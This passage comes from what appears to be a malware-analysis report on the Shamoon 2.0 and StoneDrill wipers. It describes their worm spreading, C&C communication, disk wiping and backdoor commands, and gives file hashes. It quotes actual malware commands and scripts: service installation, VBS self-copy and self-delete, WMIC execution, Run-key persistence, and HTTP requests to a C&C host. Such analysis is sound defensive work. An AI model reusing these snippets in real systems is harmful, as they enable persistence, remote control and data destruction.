bit variant. The variant is contained within a resource
named “X509”. The resource is de
-
XORed and dropped onto the system under:
<
%WindowsDir%
\
system32
\
ntssrvr64.exe>
.
It is then installed as a service via the command:
“cmd.exe /c ""ping
-
n 30 127.0.0.1 >nul && sc config NtsSrv binpath=
""C:
\
WINDOWS
\
system32
\
ntssrvr64.exe LocalService"" && ping
-
n 10 127.0.0.1 >nul && sc start NtsSrv”
2.1.1.
Installation as a Service
If the malware is running on a 32
-
bit system, this module installs itself as a service named
“NtsSrv”:
Name
Display Name
Description
NtsSrv
Microsoft Network Realtime
Inspection Service
Helps guard against time change attempts
targeting known
and newly discovered vulnerabilities in network time protocols
he service is set as dependent on the “RpcSs” system service. The properties of the system
service “LanmanWorkstation” are changed so that it depends on the newly created “NtsS
rv”
service to allow it to start after the malware.
2.1.2. Worm Functionality
Once this module runs (as a service), the worm
-
spreading functionality is started
,
targeting
every network host within the IPv4 address range
,
with the same first
three
bytes of
the victim’s
IP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).
Here’s how it works:
1.
The worm connects to a remote machine’s registry and disables Remote UAC by setting
the
LocalAccountTokenFilterPolicy
regi
stry key value to 1 in
HKEY_LOCAL_MACHINE
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Policies
\
system.
2.
If the RemoteRegistry system service is disabled and doesn't run on the target system,
the worm reconfigures this service to be auto
-
started and then start
s it immediately. If
the connection to a remote registry is unsuccessful, the worm repeats the connection
attempt with a hardcoded set of stolen domain administrator credentials. The worm then ,
Contact:
intelreports@kaspersky.com
9
searches for remote “
\
windows
\
system32
\
csrss.exe
” files by prep
ending this path with
the victim machine’s IP as well as system shares: ""
ADMIN$
"", ""
C$
"", ""
D$
"", ""
E$
"".
3.
Once a remote system32 folder is found, the worm copies itself into this folder under the
name “
ntssrvr32.exe
”. It schedules a remote job to run “
ntssrvr32
.exe LocalService
”
after 90 seconds.
4.
If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the
service on the remote machine with the same parameters as it used for self
-
installation.
Attempts with stolen credentials are also pe
rformed.
5.
An
alternative
but similar infection method is coded in
to
the worm, where each infection
is performed in a separate thread without relying on the scheduler; but it is not used at
this time.
2.1.3. Command and Control (C&C) Module
After replication
, the malware runs a command
-
and
-
control communication module. This
module is contained within a resource named “
Pkcs7
”. It is de
-
XORed and dropped as
<
%WindowsDir%
\
system32
\
netinit.exe>
. Using the hardcoded credentials, it creates a
Windows Task Scheduler
job that executes netinit.exe 90 seconds after creation. It waits 95
seconds and then deletes the scheduled job.
2.1.4. Wiper and Encryptor Module
Finally, the malware drops the wiper/encryptor
module. This module first checks if it’s time to
run the main payload. The activation period can be set in two ways:
1.
It checks if the system time is not earlier than the time specified in the following file:
<%windir%
\
inf
\
usbvideo324.pnf>
2.
If the file does
n’t exist, it checks that the system time is not earlier than the hardcoded
date:
<20:45, 17 Nov 2016>
At the specified time, the malware drops
two
files:
The first file,
<c:
\
windows
\
temp
\
key8854321.pub>
is unused in this attack and contains a
public encry
ption key. This is an indicator that the attackers might be using
Shamoon as a
ransomware tool
in upcoming waves.
”
-----
BEGINPUBLICKEY
-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAusZItknNNeV+xjPzIZLyB5m6gaNREC6I3CZQ7F1vDU
CaGki83s6JVDo2NGN70mhx4q5NJrg
XDzD7McpxDoJsDkKwr5mm3yEs9vmZwHcEWcvU6QbJguFgPJk6zoatVq0
WsfIkN50ywQMVq2zmiJel2UoalPJzCWbAYG0BShXjnlcsfV8GcPW+fNRCSGKVue3RE6cV5HlAjSD8VSk4KERPu
Wfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC
oxXj6CSg9xKgGgnJazC/u3R0n
m/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ
eF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9
0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc
Ek+Dt8
s4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD
onmBm2AETME74MRPmC/FWgsCAwEAAQ==
-----
ENDPUBLICKEY
-----
”
,
Contact:
intelreports@kaspersky.com
10
The second file is dropped from a resource named “
PKCS12
”. It is de
-
XORed and dropped into
the %system% directory with
a name randomly selected from
the
following list:
caclsrv.exe
dvdquery.exe
msinit.exe
sigver.exe
wcscript.exe
certutl.exe
event.exe
ntfrsutil.exe
routeman.exe
ntnw.exe
clean.exe
findfile.exe
ntdsutl.exe
rrasrv.exe
netx.exe
ctrl.exe
gpget.exe
power.exe
sacses.exe
fsutl.exe
dfrag.exe
ipsecure.exe
rdsadmin.exe
sfmsc.exe
extract.exe
dnslookup.exe
iissrv.exe
regsys.exe
smbinit.exe
The dropped payload is then scheduled to run in the same way as the C&C communication
module. We describe it in detail
below.
2.2. 64
-
bit Shamoon Dropper (ntssrvr64.exe)
SHA256
47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34
MD5
8fbe990c2d493f58a2afa2b746e49c86
Compiled
2009.02.15 12:32:19 (GMT), VC 2010
Type
AMD64 Console EXE
Size
717 312 bytes
This dropper
has
the same functionality as the 32
-
bit variant. This version is contained within a
resource named “
X509
”. The resource is de
-
XORed and dropped onto the system under:
<%WindowsDir%
\
system32
\
ntssrvr64.exe>
.
2.2.1. C&C Communication Module (net
init.exe)
SHA256
61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842
MD5
5bac4381c00044d7f4e4cbfd368ba03b
Compiled
2009.02.15 12:29:20 (GMT), VC 2010
Type
I386 Console EXE
,
Contact:
intelreports@kaspersky.com
11
Size
159 744 bytes
SHA256
772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5
MD5
ac4d91e919a3ef210a59acab0dbb9ab5
Compiled
2009.02.15 12:29:41 (GMT), VC 2010
Type
AMD64 Console EXE
Size
183 808 bytes
The strings in the C&C module are obfuscated by simple ADD operations and are decrypted
upon execution. This module periodically connects to
a
C&C with the following URL:
hxxp://server/category/page.php?
shinu=
w74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb
XR+0ghrH
YIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==
The strange “
server
” in the URL string suggests multiple possibilities:
1.
It is used by mistake.
2.
It may suggest a placeholder value that wasn’t set for the purposes of this attack.
3.
A server with this name might be
installed by the attackers somewhere inside the local
network.
4.
The local network may rely on a now poisoned DNS server.
The string also contains the word “
shinu=
”, which is quite interesting. This is possibly a
transliteration of the Gulf Arabic slang wor
d
‘
ونش
’
for
‘
what?
’.
This particular slang is used in
several countries, notably Iraq, but also sometimes in Kuwait and Bahrain. The “shinu”
parameter string contains the following encoded information about the victim system:
●
Host IP and MAC addresses
●
Wind
ows version information
●
Windows input locale IDs (keyboard layouts)
●
Number of connection attempts, or content of the
<%WINDIR%
\
inf
\
netimm173.pnf>
file
if the file exists. The
<netimm173.pnf>
file contains information about changes made by
the wiper payload
module.
If the direct connection fails, this module tries to connect using a hardcoded proxy
server
of
“1.1.1.1:8080”. This supports the assumption that the malware deployed in this case does not
include a working C&C and the operators used a raw, unconfi
gured C&C module.
Data received from the C&C server is handled in two possible ways:
1.
An executable file is downloaded as
<%TEMP%
\
Temp
\
filer%rndDigits%.exe>
and
executed immediately thereafter.
,
Contact:
intelreports@kaspersky.com
12
2.
A file is dropped in
<%WINDIR%
\
inf
\
usbvideo324.pnf>
that contai
ns the wiper
payload’s activation time. This effectively allows the attackers to configure the wiper
time
bomb
.
2.2.2. Disk Wiper/Encryptor Module
SHA256
128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd
MD5
2cd0a5f1e9bcce6807e57ec8477d222a
Compiled
2009.02.15 12:30:19 (GMT), VC 2010
Type
I386 Console EXE
Size
282 112 bytes
SHA256
c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a
MD5
c843046e54b755ec63ccb09d0a689674
Compiled
2009.02.15 12:30:41 (GMT), VC 2010
Type
AMD64 Console EXE
Size
327 680 bytes
Despite the wide
spread
coverage of the resurgence of the Shamoon wiper, few have noted the
new ransomware functionality. The wiper module of Shamoon 2.0 has been designed to run as
either a wiper or an encryptor (ran
somware).
1.
The module is configured to wipe the disk using the
“Death of Alan Kurdi”
photo
. The
picture depicts a three
-
year
-
old Syrian refugee who drowned as his family attempted to
reach E
urope and
travel on
to Canada. The module can also be configured to wipe the
disk using random data.
2.
In the “encryption/ransomware” mode, a weak pseudo
-
random RC4 key is generated,
which is further encrypted by the RSA public key and stored directly on the hard drive (at
<
\
Device
\
Harddisk0
\
Partition0>)
starting at offset 0x201, right after the master boot
record.
3.
Once the module is extracted, it drops a legitimate driver named
<DRDISK.SYS>
to the
disk and starts it. This driver is used for low
-
level disk operations and is well known from
previous Shamoo
n attacks. Before accessing this driver, the system date is changed to
a random day
between
the
1st
and
20th of Aug
ust
, 2012 to fool the driver’s license
checks and evaluation period.
,
Contact:
intelreports@kaspersky.com
13
4.
The payload employs the file
<%WINDIR%
\
inf
\
netimm173.pnf>
to keep track
of the
operations performed. The content of this file is sent to the C&C server by the
communication module.
5.
The strings in this module are also obfuscated by simple ADD operations and decrypted
at start.
2.2.3. Payload Configuration
There are two 25
-
b
yte length configuration strings in the wiper payload:
●
“
SPPPPPPPPPMPPHHHHHHHHHHBO
”
●
“
NNNNNNNNNNWNNNNNNNNNNNWWW
”
Letters in the first string specify a type of operation to be performed, with the available operations
explained below. The second string design
ates how these operations should be performed: the letter '
N
'
means that the operation will be executed synchronously in separate threads, the letter '
W
' means the
operation will wait until a previous step is completed.
Here’s an explanation of the configu
ration string above:
Letter
Operation
S
The first operation, marked by the letter '
S
' wipes (or encrypts) the content of the Shamoon
2
.0
components (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low
-
level disk
access driver makes it poss
ible to wipe the body of a running executable.
P
The next 9 '
P
' letters indicate wiping (or encrypting) of the files placed inside the traditional
user folders: desktop, download, document, desktop, download, document, picture, video,
and music.
M
The '
M
' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to
Z:, except the system drive.
P
The next two '
P
' letters wipe (or encrypt) files inside the following folders:
<C:
\
Windows
\
System32
\
Drivers> and
<C:
\
Windows
\
System32
\
Config
\
systemprofile>
H
The 10 '
H
' letters wipe (or encrypt)
some
of the partitions from 9 to 0 on hard disks 9
-
0
(SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are
skipped
in
this step)
B
The '
B
' l
etter wipes (or encrypts) part of the partition designated as FirmwareBootDevice
O
The final '
O
' wipes (or encrypts) the Master File Table on the system drive, the first sector of
\
Device
\
Harddisk0
\
Partition0, and the
last
part of the SystemBootDevice
partition.
Two minutes after all tasks are completed, the system is rebooted with the following command:
“
shutdown
-
r
-
f
-
t 2
”.
,
Contact:
intelreports@kaspersky.com
14
2.2.4. Low
-
Level Disk Access Driver (DRDISK.SYS)
SHA256
4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6
MD5
1493d342e7a36553c56b2adea150949e
Compiled
2011.12.28 16:51:24 (GMT), VC 2005
Type
I386 Native
Size
27 280 bytes
SHA256
eaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9
MD5
42f883d029b47f9d490a427091da3f5d
Compiled
2011.12.28
16:51:29 (GMT), VC 2005
Type
AMD64 Native
Size
31 998 bytes
These signed legitimate drivers
form
part of the
EldoS RawDisk product
. This product is
designed to provide direct access to disks and protected files fr
om user
-
mode applications.
Sadly, this functionality has been adopted and abused by multiple threat actors to develop wiper
malware, as in the case of the
original Sh
amoon
or the
Lazarus Destover
malware used in the
infamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk
drivers’ evaluation period license checks, the
Shamoon 2.0 malware changes the system date
to a random day
between the
1st
and
20th of Aug
ust
, 2012.
2.3. From Shamoon 2.0 to StoneDrill 1.0
StoneDrill has some style similarities to the previously discovered Shamoon
samples.
Particularly interesting is the heavy use of anti
-
emulation techniques in the malware, which
prevents the automated analysis by emulators or sandboxes.
One of the most interesting characteristics is the presence of the Persian language in multipl
e
resource sections.
,
Contact:
intelreports@kaspersky.com
15
Samples of the StoneDrill malware were uploaded multiple times to multiscanner systems from
Saudi Arabia between 27 and 30 November 2016. One StoneDrill victim was also observed in
the Kaspersky Security Network (KSN) in Europe.
2.4
. The StoneDrill wiper
SHA256
62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260
MD5
0ccc9ec82f1d44c243329014b82d3125
Compiled
1999.02.08 06:15:47 (GMT), VC 2015
Type
I386 GUI EXE
Size
195072 bytes
The malware PE file timestamp is fake
;
however
,
the
authors forgot to alter a timestamp inside
the debug directory. The real timestamp from the debug directory points to: 2016.11.14
21:16:45
,
Contact:
intelreports@kaspersky.com
16
1.
The module highlighted above starts from a heavy anti
-
emulation function that contains
numerous WinA
PI calls with invalid parameters. The goal is to break through the
detection of antivirus emulators and heuristic detection.
2.
The second anti
-
emulation technique is run before the payload execution: this module
creates a hidden dialog window, then finds an
d programmatically clicks the “OK” button
on that dialog. After that, another series of incorrect WinAPI calls follow.
3.
The malware then finds the file path of
the
default Internet browser app by looking into
the following registry keys:
a.
SOFTWARE
\
Microsoft
\
Windows
\
Shell
\
Associations
\
UrlAssociations
\
http
\
Us
erChoice
b.
HKCR
\
%ProgId_val%
\
shell
\
open
\
command
4.
The malware then checks to ensure the browser is not
LaunchWinApp.exe
or is
compiled for the 64
-
bit architecture, in
which
case the path of
“
%PROGRAM_FILESX86%
\
Internet Explorer
\
iexplore.exe
” is used instead.
5.
The default browser is then started and the wiper module is injected into the running
browser memory.
6.
After the successful start of the wiper module, the following script is dropped and
executed: “
%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs”
7.
Another temporary file is dropped “%temp%
\
C
-
Dlt
-
C
-
Trsh
-
T.tmp
” which contains the
name of the Injector module; this file is deleted after execution is completed.
WScript.Sleep(10 * 1000)
On Error Resume Next
Set WshShell = CreateObject(""
Scripting.FileSystemObject"")
While WshShell.FileExists(""%selfname%"")
WshShell.DeleteFile ""%selfname%""
Wend
WScript.Sleep(10 * 1000)
WshShell.DeleteFile ""%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs""
Set WshShell = Nothing
%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs File contents
2.4.1. The Sto
neDrill Disk Wiper Module
SHA256
bf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc
MD5
697c515a46484be4f9597cb4f39b2959
Compiled
2016.11.14 21:16:40 (GMT), VC 2015
Type
I386 GUI EXE
Size
130 560 bytes
Unlike Shamoon, the StoneDrill
disk wiper module is not written onto disk but instead is injected
directly into the user’s preferred browser process memory. This module inherits the second anti
-,
Contact:
intelreports@kaspersky.com
17
emulation trick only (clicking the button on the hidden dialog window); it is also obfuscate
d with
the same alphabet
-
based string encryption. If the browser process privileges do not permit the
raw disk wiping, only the user
-
accessible files are deleted.
Depending on the configuration, this module wipes with random data one of foll
o
wing possible
targets:
●
All accessible physical drives by using the device path “
\
\
.
\
PhysicalDrive
”
●
All accessible logical drives by using device path “
\
\
.
\
X:
”
●
Recursively wipes and deletes files in all folders except “
Windows
” on all accessible
logical drives
●
Places a
special emphasis
on
wiping files named “
asdhgasdasdwqe%digits%
” in the
root folder of the disk.
Just like Shamoon, after the wipe process is completed, the system is rebooted.
2.5. The StoneDrill backdoor
According to the PE timestamps from StoneDrill samp
le
two
and sample
one
(2016.10.19 and
2016.11.14 respectively), this malware file was compiled a month before the previously
described StoneDrill sample. However, internally this tool wrapper (injector) looks like a more
modern evolution of the previously
discussed wiper wrapper.
The sample is generally of low quality, with many unused code blocks, unreliable anti
-
emulation
and few non critical bugs. In some cases functions are executed but the results are not used
:
●
I
s the current user a domain administrat
or
?
●
I
s the antivirus process currently running
?
●
Is the current process running in a virtual environment such as VMware or VirtualBox?
2.6. The StoneDrill Installer/Injector module
SHA256
69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db
MD5
ac3c25534c076623192b9381f926ba0d
Compiled
2016.10.19 14:26:01 (GMT), VC 2015
Type
I386 GUI EXE
Size
227840
bytes
2.6.1. First step: anti
-
emulation tricks
This module is very similar to
the
above discussed injector module, utilizing the same set of
anti
-
emulation tricks, injection into
the user’s preferred
browser and
VBS
scripts. A distinction in ,
Contact:
intelreports@kaspersky.com
18
this sample is the wide utilization of the WMI command
-
line (WMIC) utility to run tasks such as
running the dropped VBS script or
making
registry modificat
ions.
Strings in this module are encrypted
in
two
ways:
●
Alphabet replacement
●
SSE XOR 0x5235
2.6.
2
. Second step: name construction
and installation
This module checks if it is already running from the “%COMMON_APPDATA%
\
Chrome”
folder.
In cases where the malware is started from a different folder, the installation procedure is
started.
During installation, a name is constructed through concatenation of three randomly selected
strings from the below three sets
–
for example
Power
NetworkProxy, RAMFirewallTransfer,
LocationAgentFramework):
Set1
Intel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet,
MFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory,
Monitor, CDROM, Run
-
time, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop,
Display
Set2
File, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent,
Data, Wizard, Server, Media, History, Stor
age, Core, boot, Gaming, Firewall
Set3
Manager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy,
Recovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub,
Execute, Luncher, F
ramework, Tester, Model, Backup, API
The VBS script “%TEMP%
\
C
-
PDC
-
C
-
Cpy
-
T.vbs
” is then dropped in
%TEMP%
\
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemObject"")
WshShell.CopyFile ""
%SELF_NAME%
"" , ""
%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe""
Set WshShell = Nothing
C
-
PDC
-
C
-
Cpy
-
T.vbs body template
The script is executed using the following command to do self
-
copy into the
“%COMMON_APPDATA%
\
Chrome”
folder:
cmd /c WMIC Process Call Create ""C:
\
Windows
\
System32
\
Wscript.exe //N
OLOGO
%TEMP%
\
C
-
PDC
-
C
-
Cpy
-
T.vbs""
Another VBS script named “
C
-
PDI
-
C
-
Cpy
-
T.vbs
” is dropped into %TEMP% folder and executed
in the same method (via WMIC used to make
a
second malware copy with pathname)
“
C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%Stp.exe
”
,
Contact:
intelreports@kaspersky.com
19
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemObject"")
WshShell.CopyFile ""
%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe"" ,
""C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%
Stp.exe""
C
-
PDI
-
C
-
Cpy
-
T.vbs body template
Pathnames of these
two VBS files as well as
the
initial malware pathname are written into
%TEMP%
\
C
-
Dlt
-
C
-
Trsh
-
T.tmp
file.
At the end of the installation procedure the copy of malware (found in
“%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe
”) is executed (via “
cmd /c
wmic proce
ss call create
”) and
the
initial process terminate
s
itself.
2.6.
3
.
Third
step
When the malware is started from within the “%COMMON_APPDATA%
\
Chrome
” folder, the
“
FileInfo.txt
” file is created in the same folder and contains the pathname of the first copy of
malware (“%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe
”)
Then the third copy of the malware is created by the command “
%COMSPEC% /c copy
""%SELFNAME"" %TEMP%
\
bd891.tmp
”, which checks
the
target file to verify if command
execution is successful, then deletes
the bd891.tmp file. The last mentioned is used as another
anti
-
emulation trick in the StoneDrill arsenal.
2.6.
4
.
Fourth
step: Payload injection
The payload is extracted from the resources section, decrypted and unpacked similarly to the
previously describe
d wiper injector module. The difference here is that for the decryption of the
payload module, SSE instructions are used.
In the same style, the payload is injected into the user preferred browser process, with an
additional step after the payload module i
njection: the resource segment responsible for the
payload configuration is replaced in memory with the resource taken from
the
parent module.
After the payload start is attempted, the
VBS
files listed inside
C
-
Dlt
-
C
-
Trsh
-
T.tmp
and
C
-
Dlt
-
C
-
Trsh
-
T.tmp
are d
eleted.
2.6.
5
.
Fifth
step: If not started
If the payload is not started
,
then %TEMP%
\
C
-
Dlt
-
C
-
Org
-
T.vbs
is dropped and executed to
delete initial malware copy.
WScript.Sleep(10 * 1000)
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemOb
ject"")
While WshShell.FileExists(""
%initial_malware_pathname%
"")
WshShell.DeleteFile ""
%initial_malware_pathname%
""
Wend
,
Contact:
intelreports@kaspersky.com
20
WScript.Sleep(10 * 1000)
WshShell.DeleteFile ""
%TEMP%
\
C
-
Dlt
-
C
-
Org
-
T.vbs""
Set WshShell = Nothing
2.7. StoneDrill
r
emote access payload
module
SHA256
105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b
MD5
e3a82d1db3ae8b189d2e1e0a22d6c82f
Compiled
2016.10.19 16:49:36 (GMT), VC 2015
Type
I386 GUI EXE
Size
317 440 bytes
Version
2.0.1610.76
This module is not dropped into disk but injected directly into the user preferred browser
process memory. The module is written in C++ with
the use of
STL classes, with numerous
forgotten debug strings.
2.7.1. First step: Decryption
Strings in this module
are encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti
-
emulation technique is utilized which makes the whole module unstable. The author assumed
that the execution of
the
Sleep function with parameter 4020 milliseconds
would
increase the
system
value of KUSER_SHARED_DATA::InterruptTime to
four
seconds (rounded to
the
nearest
second). If the InterruptTime
is
increased only by
two
seconds this module just exits
immediately
.
In case of other values, the module will crash due
to the
incorrect
decryption of
strings.
The configuration block is then loaded from resources and decrypted by two passes of XOR.
The
original module configuration resource is empty
-
the injector module just patches this
resource
,
replacing the configuration
with
its ow
n. In the configuration block, “
ux
” and “
uy
”
are
the C&C servers, “
Cid
” is part of
the
connection query and seems to be a client ID.
,
Contact:
intelreports@kaspersky.com
21
2.7.2. Second step: Registering autorun of installer (injector) module
The malware reads and de
-
XORs content of the
C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt
file, then deletes and unregisters the
autorun file defined in
FileInfoStp.txt
(autorun key deleted from registry) with the command:
cmd /c REG DELETE HKCU
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Run /v Stp
/f
”
Next, the file
C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt
is deleted and replaced by the
command:
cmd /c Copy /Y ""C:
\
ProgramData
\
Chrome
\
FileInfo.txt"" ""C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt""
The malware then drops and executes file %
TEMP%
\
C
-
Strt
-
C
-
Up
-
T.bat
ping 1.0.0.0
-
n 1
-
w 20000 > nul
@ECHO OFF
wmic /NameSpace:
\
\
root
\
default Class StdRegProv Call SetStringValue hDefKey = ""&H80000001""
sSubKeyName = ""Software
\
Microsoft
\
Windows
\
CurrentVersion
\
Run"" sValue
=
""C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%
Stp.exe"" sValueName = ""Stp""
Del ""
%TEMP%
\
C
-
Strt
-
C
-
Up
-
T.bat""
2.7.3. Third step: C&C server selection
Multiple attempts are made to connect to the hosts configured in the
ux
and
uy
fields
(found in
the samp
le configuration). The malware issues
GET
requests to
“
ct_if/ctpublic/Check_Exist.php
”. The server answering with
the
“
HANW
-
J6YS
-
P81J
-
KSD7
”
string is selected as
the
current live server.
C&C login
The n
ext connection is a login attempt with
the
following request
:
POST
/ HTTP/1.1
Host:
www.eservic.com
User
-
Agent:
Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept
-
Language:
en
-
US,en;q=0.5
Referer:
http://
www.eservic.com/
Connection:
close
Content
-
Type:
application/x
-
www
-
form
-
urlencoded
Content
-
Length:
96
username=
MD5Sum(login)
&password=
MD5Sum(password)
&button=Login
,
Contact:
intelreports@kaspersky.com
22
2.7.4. Fourth step: Get commands list
During the fourth step, the malware requests
available commands from the C&C
:
GET
/insert/index?id=
%cid_from_config%%random_part_of_client_id%
&hst=
%base64encoded_computer_and_user_
name_cpuid0_checksum%
&ttype=102&sta
te=201
HTTP/1.1
Host: www.eservic.com
Accept: text/html,application/xhtml+xml,applica
tion/xml;q=0.9,*/*;q=0.8
Accept
-
Language: en
-
US,en;q=0.5
Cookie:
%string_received_in_login_step%
Connection: close
Here is a list of the StoneDrill commands
available
:
Command
Internal Help Strings
Command Description
os
1. OS (The is Response the
Operating
System of the Client Machine)
Return details about Windows version, edition,
architecture and environment
version
2. Version (The Response is Version of
Running Product on the Client Machine)
“
2.0.1610.76
” string returned
time
3. Time (The
Response is Current Time of
the Client Machine)
Current system and local time are returned
shell
4. Shell Value (Give You Access the CMD
Console in the Client Machine; Value is
Anything that You Want to Writing in the
CMD Console of the Client Machine and
Execute it)
Stdout/stderr streams of executed “
cmd.exe /C
%value%” command are captured and send back
to CC
screenshot
5. Screenshot (The Response is a JPEG File
of the Screenshot of the Client Machine
Desktop)
1
-
At first the malware takes screenshot into
randomly named
.bmp
file in %TEMP% folder.
2
-
Then takes second screenshot, now with jpeg
compression and store it as
.jpg
file with random
name. In case of success
jpg
creation
bmp
file is
deleted.
3
-
Send scre
enshot file to C&C and delete temporary
files.
delay
6. Delay Value (Adjust the Time
-
Interval for
the Server and Client Communication; Value
can be Between 1000
-
100000; 1000 is High
-
End Speed)
download
7. Download ""From"" ""To"" (Download a File
From ""a UR
L"" To ""a Directory on the Client
Machine"")
Downloaded file initially stored as
“%TEMP%
\
Test.tmp
”, then deXORed with 0xCC
and copied to specified location with VBS script “
C
-
Dled
-
C
-
Cpy
-
T.vbs
” as previously described, file is
then executed with command:
""
cmd
/c WMIC Process Call
Create ,
Contact:
intelreports@kaspersky.com
23
C:
\
Windows
\
System32
\
Wscri
pt.exe //NOLOGO
upload
8. Upload ""From"" (Upload a File From ""a
Directory on the Client Machine"")
update
9. Update ""From"" (Download the New
Version of the Product From ""a URL"" and
Execute it on the
Client Machine)
Downloaded file initially stored with random name
inside %TEMP% folder, then renamed by using
C
-
Uptd
-
C
-
Cpy
-
T.vbs
and
C
-
Up
-
C
-
Dt
-
T.bat
similar to
previous steps
uninstall
10. Uninstall (Uninstall The Running Product
from the Client Machine a
nd Delete All Side
-
Effects)
Unregister autorun with
command:
cmd /c REG DELETE
HKCU
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Run
/v Stp /f
Then drop and run
C
-
Un
-
C
-
Instl
-
T.bat
with body:
ping 1.1.1.1
-
n 5
-
w 2000 > nul
RMDIR /S /Q
""C:
\
ProgramData
\
Chrome
\
""
RMDIR /S /Q ""C:
\
ProgramData
\
InternetExplorer
\
""
Del ""
%TEMP%
\
C
-
Un
-
C
-
Instl
-
T.bat""
Then terminates itself.
antivirus
11. Antivirus (The Response is Installed
Antivirus on the Client Machine)
Queries Windows Management Instrumentation
(WMI) database for installed
AntiVirusProduct
details. Runs additional registry
lookups for details of:
Avast
,
McAfee
,
Avg
,
BitDefender
products.
help
12. Help (Response is the List of Supported
Commands in the Current Version of Product
that Running on
the Client Machine)
List title is
""
-
Command List of the Current
Vesrion are:""
2.8. StoneDrill
s
imilarities with Shamoon
Of course, one of the most important questions is the following: are StoneDrill and Shamoon
connected? This is a difficult question t
o answer
.
H
owever, by listing the similarities and
differences between the two,
any
one can come up with their own answer.
Although we used a Yara built on Shamoon samples to find StoneDrill, there are several other
similarities between the two:
●
Both Shamo
on and StoneDril appear to be targeting Saudi organizations.
●
Samples have been compiled around the same time
-
October
-
November 2016.
●
Similar to previous generations of Shamoon, StoneDrill uses encrypted PE resources to
store the actual payload.
,
Contact:
intelreports@kaspersky.com
24
The m
ost important differences include:
●
To avoid detection by emulators and sandboxing tools, the StoneDrill authors used
far
more advanced anti
-
emulation techniques than Shamoon.
●
StoneDrill utilises VBS scripts to run self
-
delete scripts, while Shamoon didn’t
use any
external scripts.
●
A distinction from the Shamoon malware is that the strings encryption in StoneDrill is
performed by alphabet table replacement.
●
StoneDrill does not use drivers during deployment, but rather through memory injection
into the victim
’s preferred browser.
2.9. StoneDrill
s
imilarities with News
B
eef
Our initial analysis of StoneDril revealed some similarities with a threat actor we’ve seen before
-
News
B
eef. While we call
this
the News
B
eef
APT, this group has been reported in the past as
Charming Kitten or Newscaster
(
in 2014
)
.
The similarities between News
B
eef and StoneDrill make us believe there is a
very
strong
connection there. Below we list some of the similarities we observed:
2.9.1.
Winmain Signature
In NewsBeef:
B8 08 00 FE 7F FF 30 8F 44 24 20 68 B4 0F 00 00 FF 15 78 70 44 00 B8 08 00 FE 7F FF 30 8F 44 24 24 8B 4C
24 24 2B 4C 24 20 B8 6B CA 5F 6B F7 E1 C1 EA 16 80 EA 02 88 15 95 71 45 00
In StoneDrill:
B8 08 00 FE 7F FF 30 8F 44 24
